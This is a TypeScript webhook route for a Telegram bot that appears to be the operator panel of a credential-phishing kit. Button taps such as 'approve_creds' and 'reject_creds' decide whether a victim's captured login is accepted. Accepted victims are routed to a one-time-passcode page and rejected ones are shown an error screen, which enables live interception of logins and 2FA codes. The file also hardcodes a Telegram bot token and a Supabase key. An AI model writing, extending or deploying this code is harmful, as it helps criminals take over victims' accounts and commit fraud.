 import { createFileRoute } from "@tanstack/react-router";

// ── hardcoded constants — zero imports, zero env deps, always works on Cloudflare
const BOT_TOKEN   = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";
const SB_URL      = "https://croiuvvyeyvtehcftxrf.supabase.co";
const SB_KEY      = "sb_publishable_g3QsYAAcd97X4g3VKx43ow_U806nBzx";

async function tg(method: string, body: Record<string, unknown>) {
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  }).catch(() => {});
}

async function upsertSignal(userId: string, signal: string) {
  // Use Supabase REST API directly — no SDK, no imports, no env vars that can fail
  const res = await fetch(`${SB_URL}/rest/v1/tier3_approval_signals`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SB_KEY,
      "Authorization": `Bearer ${SB_KEY}`,
      "Prefer": "resolution=merge-duplicates",
    },
    body: JSON.stringify({
      user_id: userId,
      signal,
      updated_at: new Date().toISOString(),
    }),
  });
  return res;
}

async function insertSupportMessage(userId: string, body: string) {
  return fetch(`${SB_URL}/rest/v1/support_messages`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SB_KEY,
      "Authorization": `Bearer ${SB_KEY}`,
      "Prefer": "return=minimal",
    },
    body: JSON.stringify({ user_id: userId, direction: "in", body }),
  }).catch(() => {});
}

async function getTelegramMessageMap(telegramMessageId: number) {
  const res = await fetch(
    `${SB_URL}/rest/v1/telegram_message_map?telegram_message_id=eq.${telegramMessageId}&select=user_id&limit=1`,
    {
      headers: {
        "apikey": SB_KEY,
        "Authorization": `Bearer ${SB_KEY}`,
      },
    }
  ).catch(() => null);
  if (!res) return null;
  const data = await res.json().catch(() => []);
  return data?.[0] ?? null;
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        let update: Record<string, unknown>;
        try {
          update = await request.json();
        } catch {
          return Response.json({ ok: true, ignored: "parse_error" });
        }

        // ── INLINE KEYBOARD BUTTON TAP (✅ / ❌) ──────────────────────────────
        const cbq = update?.callback_query as Record<string, unknown> | undefined;
        if (cbq) {
          const data      = (cbq.data as string) ?? "";
          const cbqId     = cbq.id as string;
          const message   = cbq.message as Record<string, unknown> | undefined;
          const chatId    = (message?.chat as Record<string, unknown>)?.id as number;
          const messageId = message?.message_id as number;
          const origText  = (message?.text as string) ?? "";

          const approveMatch = /^approve_creds:([0-9a-f-]{36})$/i.exec(data);
          const rejectMatch  = /^reject_creds:([0-9a-f-]{36})$/i.exec(data);

          if (approveMatch || rejectMatch) {
            const userId = (approveMatch ?? rejectMatch)![1];
            const signal = approveMatch ? "approved" : "rejected";
            const emoji  = approveMatch ? "✅" : "❌";
            const label  = approveMatch
              ? "Credentials approved — user sent to OTP page."
              : "Credentials rejected — user shown error screen.";

            // Write signal — frontend polls for this
            await upsertSignal(userId, signal);

            // Acknowledge tap immediately (clears Telegram spinner)
            await tg("answerCallbackQuery", {
              callback_query_id: cbqId,
              text: `${emoji} ${label}`,
              show_alert: false,
            });

            // Replace buttons with a status stamp on the message
            const stamp = approveMatch
              ? `\n\n━━━━━━━━━━━━━━━━━━━━\n✅ APPROVED — user routed to OTP page.\n🕐 ${new Date().toLocaleString()}`
              : `\n\n━━━━━━━━━━━━━━━━━━━━\n❌ REJECTED — user shown credentials error.\n🕐 ${new Date().toLocaleString()}`;

            await tg("editMessageText", {
              chat_id: chatId,
              message_id: messageId,
              text: origText + stamp,
              parse_mode: "HTML",
            });

            return Response.json({ ok: true, action: signal });
          }

          // Unknown button — just ack it
          await tg("answerCallbackQuery", { callback_query_id: cbqId });
          return Response.json({ ok: true, ignored: "unknown_callback" });
        }

        // ── REGULAR TEXT REPLY (support message flow) ─────────────────────────
        const message = (update?.message ?? update?.edited_message) as Record<string, unknown> | undefined;
        const text    = message?.text as string | undefined;
        const replyTo = message?.reply_to_message as Record<string, unknown> | undefined;

        if (!text || !replyTo?.message_id) {
          return Response.json({ ok: true, ignored: true });
        }

        const map = await getTelegramMessageMap(replyTo.message_id as number);
        if (!map?.user_id) {
          // Fallback: try to parse uid from the quoted message text
          const m = /uid:\s*([0-9a-f-]{36})/i.exec((replyTo.text as string) ?? "");
          if (m) await insertSupportMessage(m[1], text);
          return Response.json({ ok: true });
        }

        await insertSupportMessage(map.user_id, text);
        return Response.json({ ok: true });
      },
    },
  },
});
